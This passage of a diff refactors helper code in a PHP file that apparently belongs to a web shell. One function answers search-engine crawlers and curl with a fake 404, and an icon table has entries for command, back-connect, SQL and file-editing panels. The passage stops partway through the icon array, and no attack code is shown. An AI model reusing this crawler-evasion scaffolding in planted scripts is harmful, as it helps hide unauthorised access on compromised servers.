@@ -31,857 +31,753 @@ if(!function_exists('array_column')){
 	}
 }
 function blockCrawler(){
-	if(!empty($_SERVER['HTTP_USER_AGENT'])){
-		$ua = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
-		if(preg_match('/' . implode('|', $ua) . '/i', $_SERVER['HTTP_USER_AGENT'])){
-			header('HTTP/1.0 404 Not Found');
-			exit(0);
-		}
-	}
+    if (empty($_SERVER['HTTP_USER_AGENT'])) {
+        return;
+    }
+
+    $ua = ["Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl"];
+    if (preg_match('/' . implode('|', $ua) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit(0);
+    }
 }
-function fType($a,$c=null){
-	$c = !empty($c) ? $c : '2em';
-	switch($a){
-		case 'logo'	: $b = 'https://clipart-library.com/data_images/554935.png'; break;
-		case 'home' : $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--cyan)" d="M575.8 255.5c0 18-15 32.1-32 32.1h-32l.7 160.2c0 2.7-.2 5.4-.5 8.1V472c0 22.1-17.9 40-40 40H456c-1.1 0-2.2 0-3.3-.1c-1.4 .1-2.8 .1-4.2 .1H416 392c-22.1 0-40-17.9-40-40V448 384c0-17.7-14.3-32-32-32H256c-17.7 0-32 14.3-32 32v64 24c0 22.1-17.9 40-40 40H160 128.1c-1.5 0-3-.1-4.5-.2c-1.2 .1-2.4 .2-3.6 .2H104c-22.1 0-40-17.9-40-40V360c0-.9 0-1.9 .1-2.8V287.6H32c-18 0-32-14-32-32.1c0-9 3-17 10-24L266.4 8c7-7 15-8 22-8s15 2 21 7L564.8 231.5c8 7 12 15 11 24z"/></svg>'; break;
-		case 'dir'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M384 480h48c11.4 0 21.9-6 27.6-15.9l112-192c5.8-9.9 5.8-22.1 .1-32.1S555.5 224 544 224H144c-11.4 0-21.9 6-27.6 15.9L48 357.1V96c0-8.8 7.2-16 16-16H181.5c4.2 0 8.3 1.7 11.3 4.7l26.5 26.5c21 21 49.5 32.8 79.2 32.8H416c8.8 0 16 7.2 16 16v32h48V160c0-35.3-28.7-64-64-64H298.5c-17 0-33.3-6.7-45.3-18.7L226.7 50.7c-12-12-28.3-18.7-45.3-18.7H64C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H87.7 384z"/></svg>'; break;
-		case 'php'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm97 289c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0L79 303c-9.4 9.4-9.4 24.6 0 33.9l48 48c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-31-31 31-31zM257 255c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9l31 31-31 31c-9.4 9.4-9.4 24.6 0 33.9s24.6 9.4 33.9 0l48-48c9.4-9.4 9.4-24.6 0-33.9l-48-48z"/></svg>'; break;
-		case 'zip'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16h48c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16h48v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm48 112c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H128c-8.8 0-16 7.2-16 16zm0 64c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H128c-8.8 0-16 7.2-16 16zm-6.3 71.8L82.1 335.9c-1.4 5.4-2.1 10.9-2.1 16.4c0 35.2 28.8 63.7 64 63.7s64-28.5 64-63.7c0-5.5-.7-11.1-2.1-16.4l-23.5-88.2c-3.7-14-16.4-23.8-30.9-23.8H136.6c-14.5 0-27.2 9.7-30.9 23.8zM128 336h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H128c-8.8 0-16-7.2-16-16s7.2-16 16-16z"/></svg>'; break;
-		case 'img'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160H256c-17.7 0-32-14.3-32-32V0H64zM256 0V128H384L256 0zM64 256a32 32 0 1 1 64 0 32 32 0 1 1 -64 0zm152 32c5.3 0 10.2 2.6 13.2 6.9l88 128c3.4 4.9 3.7 11.3 1 16.5s-8.2 8.6-14.2 8.6H216 176 128 80c-5.8 0-11.1-3.1-13.9-8.1s-2.8-11.2 .2-16.1l48-80c2.9-4.8 8.1-7.8 13.7-7.8s10.8 2.9 13.7 7.8l12.8 21.4 48.3-70.2c3-4.3 7.9-6.9 13.2-6.9z"/></svg>'; break;
-		case 'txt'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>'; break;
-		case 'css'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M480 32l-64 368-223.3 80L0 400l19.6-94.8h82l-8 40.6L210 390.2l134.1-44.4 18.8-97.1H29.5l16-82h333.7l10.5-52.7H56.3l16.3-82H480z"/></svg>'; break;
-		case 'js'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M0 32v448h448V32H0zm243.8 349.4c0 43.6-25.6 63.5-62.9 63.5-33.7 0-53.2-17.4-63.2-38.5l34.3-20.7c6.6 11.7 12.6 21.6 27.1 21.6 13.8 0 22.6-5.4 22.6-26.5V237.7h42.1v143.7zm99.6 63.5c-39.1 0-64.4-18.6-76.7-43l34.3-19.8c9 14.7 20.8 25.6 41.5 25.6 17.4 0 28.6-8.7 28.6-20.8 0-14.4-11.4-19.5-30.7-28l-10.5-4.5c-30.4-12.9-50.5-29.2-50.5-63.5 0-31.6 24.1-55.6 61.6-55.6 26.8 0 46 9.3 59.8 33.7L368 290c-7.2-12.9-15-18-27.1-18-12.3 0-20.1 7.8-20.1 18 0 12.6 7.8 17.7 25.9 25.6l10.5 4.5c35.8 15.3 55.9 31 55.9 66.2 0 37.8-29.8 58.6-69.7 58.6z"/></svg>'; break;
-		case 'html' : $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M0 32l34.9 395.8L191.5 480l157.6-52.2L384 32H0zm308.2 127.9H124.4l4.1 49.4h175.6l-13.6 148.4-97.9 27v.3h-1.1l-98.7-27.3-6-75.8h47.7L138 320l53.5 14.5 53.7-14.5 6-62.2H84.3L71.5 112.2h241.1l-4.4 47.7z"/></svg>'; break;
-		case 'other': $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M320 464c8.8 0 16-7.2 16-16V160H256c-17.7 0-32-14.3-32-32V48H64c-8.8 0-16 7.2-16 16V448c0 8.8 7.2 16 16 16H320zM0 64C0 28.7 28.7 0 64 0H229.5c17 0 33.3 6.7 45.3 18.7l90.5 90.5c12 12 18.7 28.3 18.7 45.3V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V64z"/></svg>'; break;
-		case 'info'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M384 96V320H64L64 96H384zM64 32C28.7 32 0 60.7 0 96V320c0 35.3 28.7 64 64 64H181.3l-10.7 32H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H352c17.7 0 32-14.3 32-32s-14.3-32-32-32H277.3l-10.7-32H384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm464 0c-26.5 0-48 21.5-48 48V432c0 26.5 21.5 48 48 48h64c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48H528zm16 64h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16s7.2-16 16-16zm-16 80c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16zm32 160a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>'; break;
-		case 'edit'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--cyan)" d="M471.6 21.7c-21.9-21.9-57.3-21.9-79.2 0L362.3 51.7l97.9 97.9 30.1-30.1c21.9-21.9 21.9-57.3 0-79.2L471.6 21.7zm-299.2 220c-6.1 6.1-10.8 13.6-13.5 21.9l-29.6 88.8c-2.9 8.6-.6 18.1 5.8 24.6s15.9 8.7 24.6 5.8l88.8-29.6c8.2-2.7 15.7-7.4 21.9-13.5L437.7 172.3 339.7 74.3 172.4 241.7zM96 64C43 64 0 107 0 160V416c0 53 43 96 96 96H352c53 0 96-43 96-96V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v96c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V160c0-17.7 14.3-32 32-32h96c17.7 0 32-14.3 32-32s-14.3-32-32-32H96z"/></svg>'; break;
-		case 'cmd'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>'; break;
-		case 'bc'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M80.3 44C69.8 69.9 64 98.2 64 128s5.8 58.1 16.3 84c6.6 16.4-1.3 35-17.7 41.7s-35-1.3-41.7-17.7C7.4 202.6 0 166.1 0 128S7.4 53.4 20.9 20C27.6 3.6 46.2-4.3 62.6 2.3S86.9 27.6 80.3 44zM555.1 20C568.6 53.4 576 89.9 576 128s-7.4 74.6-20.9 108c-6.6 16.4-25.3 24.3-41.7 17.7S489.1 228.4 495.7 212c10.5-25.9 16.3-54.2 16.3-84s-5.8-58.1-16.3-84C489.1 27.6 497 9 513.4 2.3s35 1.3 41.7 17.7zM352 128c0 23.7-12.9 44.4-32 55.4V480c0 17.7-14.3 32-32 32s-32-14.3-32-32V183.4c-19.1-11.1-32-31.7-32-55.4c0-35.3 28.7-64 64-64s64 28.7 64 64zM170.6 76.8C163.8 92.4 160 109.7 160 128s3.8 35.6 10.6 51.2c7.1 16.2-.3 35.1-16.5 42.1s-35.1-.3-42.1-16.5c-10.3-23.6-16-49.6-16-76.8s5.7-53.2 16-76.8c7.1-16.2 25.9-23.6 42.1-16.5s23.6 25.9 16.5 42.1zM464 51.2c10.3 23.6 16 49.6 16 76.8s-5.7 53.2-16 76.8c-7.1 16.2-25.9 23.6-42.1 16.5s-23.6-25.9-16.5-42.1c6.8-15.6 10.6-32.9 10.6-51.2s-3.8-35.6-10.6-51.2c-7.1-16.2 .3-35.1 16.5-42.1s35.1 .3 42.1 16.5z"/></svg>'; break;
-		case 'sql'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M448 80v48c0 44.2-100.3 80-224 80S0 172.2 0 128V80C0 35.8 100.3 0 224 0S448 35.8 448 80zM393.2 214.7c20.8-7.4 39.9-16.9 54.8-28.6V288c0 44.2-100.3 80-224 80S0 332.2 0 288V186.1c14.9 11.8 34 21.2 54.8 28.6C99.7 230.7 159.5 240 224 240s124.3-9.3 169.2-25.3zM0 346.1c14.9 11.8 34 21.2 54.8 28.6C99.7 390.7 159.5 400 224 400s124.3-9.3 169.2-25.3c20.8-7.4 39.9-16.9 54.8-28.6V432c0 44.2-100.3 80-224 80S0 476.2 0 432V346.1z"/></svg>'; break;
-		case 'out'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--cyan)" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>'; break;
-		case 'loader':$b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" height="'.$c.'"><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="#2be2ff" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>'; break;
-	}
-	return $b;
+
+function fType($a, $c = '2em') {
+    $icons = [
+        'logo' => 'https://clipart-library.com/data_images/554935.png',
+        'home' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="' . $c . '"><path fill="var(--cyan)" d="M575.8 255.5c0 18-15 32.1-32 32.1h-32l.7 160.2c0 2.7-.2 5.4-.5 8.1V472c0 22.1-17.9 40-40 40H456c-1.1 0-2.2 0-3.3-.1c-1.4 .1-2.8 .1-4.2 .1H416 392c-22.1 0-40-17.9-40-40V448 384c0-17.7-14.3-32-32-32H256c-17.7 0-32 14.3-32 32v64 24c0 22.1-17.9 40-40 40H160 128.1c-1.5 0-3-.1-4.5-.2c-1.2 .1-2.4 .2-3.6 .2H104c-22.1 0-40-17.9-40-40V360c0-.9 0-1.9 .1-2.8V287.6H32c-18 0-32-14-32-32.1c0-9 3-17 10-24L266.4 8c7-7 15-8 22-8s15 2 21 7L564.8 231.5c8 7 12 15 11 24z"/></svg>',
+        'dir' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M384 480h48c11.4 0 21.9-6 27.6-15.9l112-192c5.8-9.9 5.8-22.1 .1-32.1S555.5 224 544 224H144c-11.4 0-21.9 6-27.6 15.9L48 357.1V96c0-8.8 7.2-16 16-16H181.5c4.2 0 8.3 1.7 11.3 4.7l26.5 26.5c21 21 49.5 32.8 79.2 32.8H416c8.8 0 16 7.2 16 16v32h48V160c0-35.3-28.7-64-64-64H298.5c-17 0-33.3-6.7-45.3-18.7L226.7 50.7c-12-12-28.3-18.7-45.3-18.7H64C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H87.7 384z"/></svg>',
+        'php' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm97 289c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0L79 303c-9.4 9.4-9.4 24.6 0 33.9l48 48c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-31-31 31-31zM257 255c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9l31 31-31 31c-9.4 9.4-9.4 24.6 0 33.9s24.6 9.4 33.9 0l48-48c9.4-9.4 9.4-24.6 0-33.9l-48-48z"/></svg>',
+        'zip' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16h48c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16h48v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm48 112c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H128c-8.8 0-16 7.2-16 16zm0 64c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H128c-8.8 0-16 7.2-16 16zm-6.3 71.8L82.1 335.9c-1.4 5.4-2.1 10.9-2.1 16.4c0 35.2 28.8 63.7 64 63.7s64-28.5 64-63.7c0-5.5-.7-11.1-2.1-16.4l-23.5-88.2c-3.7-14-16.4-23.8-30.9-23.8H136.6c-14.5 0-27.2 9.7-30.9 23.8zM128 336h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H128c-8.8 0-16-7.2-16-16s7.2-16 16-16z"/></svg>',
+        'img' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160H256c-17.7 0-32-14.3-32-32V0H64zM256 0V128H384L256 0zM64 256a32 32 0 1 1 64 0 32 32 0 1 1 -64 0zm152 32c5.3 0 10.2 2.6 13.2 6.9l88 128c3.4 4.9 3.7 11.3 1 16.5s-8.2 8.6-14.2 8.6H216 176 128 80c-5.8 0-11.1-3.1-13.9-8.1s-2.8-11.2 .2-16.1l48-80c2.9-4.8 8.1-7.8 13.7-7.8s10.8 2.9 13.7 7.8l12.8 21.4 48.3-70.2c3-4.3 7.9-6.9 13.2-6.9z"/></svg>',
+        'txt' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>',
+        'css' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M480 32l-64 368-223.3 80L0 400l19.6-94.8h82l-8 40.6L210 390.2l134.1-44.4 18.8-97.1H29.5l16-82h333.7l10.5-52.7H56.3l16.3-82H480z"/></svg>',
+        'js' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M0 32v448h448V32H0zm243.8 349.4c0 43.6-25.6 63.5-62.9 63.5-33.7 0-53.2-17.4-63.2-38.5l34.3-20.7c6.6 11.7 12.6 21.6 27.1 21.6 13.8 0 22.6-5.4 22.6-26.5V237.7h42.1v143.7zm99.6 63.5c-39.1 0-64.4-18.6-76.7-43l34.3-19.8c9 14.7 20.8 25.6 41.5 25.6 17.4 0 28.6-8.7 28.6-20.8 0-14.4-11.4-19.5-30.7-28l-10.5-4.5c-30.4-12.9-50.5-29.2-50.5-63.5 0-31.6 24.1-55.6 61.6-55.6 26.8 0 46 9.3 59.8 33.7L368 290c-7.2-12.9-15-18-27.1-18-12.3 0-20.1 7.8-20.1 18 0 12.6 7.8 17.7 25.9 25.6l10.5 4.5c35.8 15.3 55.9 31 55.9 66.2 0 37.8-29.8 58.6-69.7 58.6z"/></svg>',
+        'html' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M0 32l34.9 395.8L191.5 480l157.6-52.2L384 32H0zm308.2 127.9H124.4l4.1 49.4h175.6l-13.6 148.4-97.9 27v.3h-1.1l-98.7-27.3-6-75.8h47.7L138 320l53.5 14.5 53.7-14.5 6-62.2H84.3L71.5 112.2h241.1l-4.4 47.7z"/></svg>',
+        'other' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M320 464c8.8 0 16-7.2 16-16V160H256c-17.7 0-32-14.3-32-32V48H64c-8.8 0-16 7.2-16 16V448c0 8.8 7.2 16 16 16H320zM0 64C0 28.7 28.7 0 64 0H229.5c17 0 33.3 6.7 45.3 18.7l90.5 90.5c12 12 18.7 28.3 18.7 45.3V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V64z"/></svg>',
+        'info' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M384 96V320H64L64 96H384zM64 32C28.7 32 0 60.7 0 96V320c0 35.3 28.7 64 64 64H181.3l-10.7 32H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H352c17.7 0 32-14.3 32-32s-14.3-32-32-32H277.3l-10.7-32H384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm464 0c-26.5 0-48 21.5-48 48V432c0 26.5 21.5 48 48 48h64c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48H528zm16 64h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16s7.2-16 16-16zm-16 80c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16zm32 160a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>',
+        'edit' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="' . $c . '"><path fill="var(--cyan)" d="M471.6 21.7c-21.9-21.9-57.3-21.9-79.2 0L362.3 51.7l97.9 97.9 30.1-30.1c21.9-21.9 21.9-57.3 0-79.2L471.6 21.7zm-299.2 220c-6.1 6.1-10.8 13.6-13.5 21.9l-29.6 88.8c-2.9 8.6-.6 18.1 5.8 24.6s15.9 8.7 24.6 5.8l88.8-29.6c8.2-2.7 15.7-7.4 21.9-13.5L437.7 172.3 339.7 74.3 172.4 241.7zM96 64C43 64 0 107 0 160V416c0 53 43 96 96 96H352c53 0 96-43 96-96V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v96c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V160c0-17.7 14.3-32 32-32h96c17.7 0 32-14.3 32-32s-14.3-32-32-32H96z"/></svg>',
+        'cmd' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>',
+        'bc' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M80.3 44C69.8 69.9 64 98.2 64 128s5.8 58.1 16.3 84c6.6 16.4-1.3 35-17.7 41.7s-35-1.3-41.7-17.7C7.4 202.6 0 166.1 0 128S7.4 53.4 20.9 20C27.6 3.6 46.2-4.3 62.6 2.3S86.9 27.6 80.3 44zM555.1 20C568.6 53.4 576 89.9 576 128s-7.4 74.6-20.9 108c-6.6 16.4-25.3 24.3-41.7 17.7S489.1 228.4 495.7 212c10.5-25.9 16.3-54.2 16.3-84s-5.8-58.1-16.3-84C489.1 27.6 497 9 513.4 2.3s35 1.3 41.7 17.7zM352 128c0 23.7-12.9 44.4-32 55.4V480c0 17.7-14.3 32-32 32s-32-14.3-32-32V183.4c-19.1-11.1-32-31.7-32-55.4c0-35.3 28.7-64 64-64s64 28.7 64 64zM170.6 76.8C163.8 92.4 160 109.7 160 128s3.8 35.6 10.6 51.2c7.1 16.2-.3 35.1-16.5 42.1s-35.1-.3-42.1-16.5c-10.3-23.6-16-49.6-16-76.8s5.7-53.2 16-76.8c7.1-16.2 25.9-23.6 42.1-16.5s23.6 25.9 16.5 42.1zM464 51.2c10.3 23.6 16 49.6 16 76.8s-5.7 53.2-16 76.8c-7.1 16.2-25.9 23.6-42.1 16.5s-23.6-25.9-16.5-42.1c6.8-15.6 10.6-32.9 10.6-51.2s-3.8-35.6-10.6-51.2c-7.1-16.2 .3-35.1 16.5-42.1s35.1 .3 42.1 16.5z"/></svg>',
+        'sql' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" height="' . $c . '"><path fill="var(--bg-icon)" d="M448 80v48c0 44.2-100.3 80-224 80S0 172.2 0 128V80C0 35.8 100.3 0 224 0S448 35.8 448 80zM393.2 214.7c20.8-7.4 39.9-16.9 54.8-28.6V288c0 44.2-100.3 80-224 80S0 332.2 0 288V186.1c14.9 11.8 34 21.2 54.8 28.6C99.7 230.7 159.5 240 224 240s124.3-9.3 169.2-25.3zM0 346.1c14.9 11.8 34 21.2 54.8 28.6C99.7 390.7 159.5 400 224 400s124.3-9.3 169.2-25.3c20.8-7.4 39.9-16.9 54.8-28.6V432c0 44.2-100.3 80-224 80S0 476.2 0 432V346.1z"/></svg>',
+        'out' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="' . $c . '"><path fill="var(--cyan)" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>',
